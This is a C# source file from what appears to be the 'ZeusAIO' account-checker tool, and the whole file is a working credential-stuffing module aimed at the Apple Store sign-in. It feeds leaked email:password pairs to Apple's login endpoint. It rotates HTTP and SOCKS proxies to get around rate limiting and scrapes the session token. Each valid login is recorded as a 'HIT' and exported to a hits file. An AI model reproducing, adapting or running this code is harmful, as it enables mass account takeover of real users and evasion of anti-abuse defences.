using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using System.Web;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace Apple
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            CookieStorage cookies = new CookieStorage();
                            string token = AppleGetToken(ref cookies);

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.AddHeader("X-Requested-With", "XMLHttpRequest");
                            req.AddHeader("x-aos-model-page", "sentryLogin");
                            req.AddHeader("syntax", "graviton");
                            req.AddHeader("x-aos-stk", token);
                            req.AddHeader("modelVersion", "v2");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("Sec-Fetch-Site", "same-origin");
                            req.AddHeader("Sec-Fetch-Mode", "cors");
                            req.AddHeader("Sec-Fetch-Dest", "empty");
                            req.Referer = "https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ";
                            req.Cookies = cookies;

                            string strResponse = req.Post(new Uri("https://secure4.store.apple.com/shop/sentryx/sign_in_crd?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&_a=customerLogin&_m=loginHome.customerLogin"), new BytesContent(Encoding.Default.GetBytes($"loginHome.customerLogin.appleId={HttpUtility.UrlEncode(s[0])}&loginHome.customerLogin.password={s[1]}"))).ToString();

                            if (strResponse.Contains("{\"head\":{\"status\":302,\"data\":{\"url\":\"https://www.apple.com/\"}},\"body\":{}}"))
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - APPLE] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Apple_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                            else if (strResponse.Contains("incorrect_appleid_password") || strResponse.Contains("Your account information was entered incorrectly.") || strResponse.Contains("reset_password_account_locked"))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                           
                        }
                    }
                    catch
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        static string AppleGetToken(ref CookieStorage cookies)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        cookies = new CookieStorage();
                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
                        req.AddHeader("Accept", "*/*");

                        string strResponse = req.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

                        if (strResponse.Contains("stk\":\""))
                        {
                            return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
                        }
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            }
            return "";
        }
            static void SetBasicRequestSettingsAndProxies(HttpRequest req)
            {
                req.IgnoreProtocolErrors = true;
                req.ConnectTimeout = 10000;
                req.KeepAliveTimeout = 10000;
                req.ReadWriteTimeout = 10000;

                {
                    string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                    ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                    if (proxy.Length == 4)
                    {
                        proxyClient.Username = proxy[2];
                        proxyClient.Password = proxy[3];
                    }
                    req.Proxy = proxyClient;
                }
            }
        }
    }

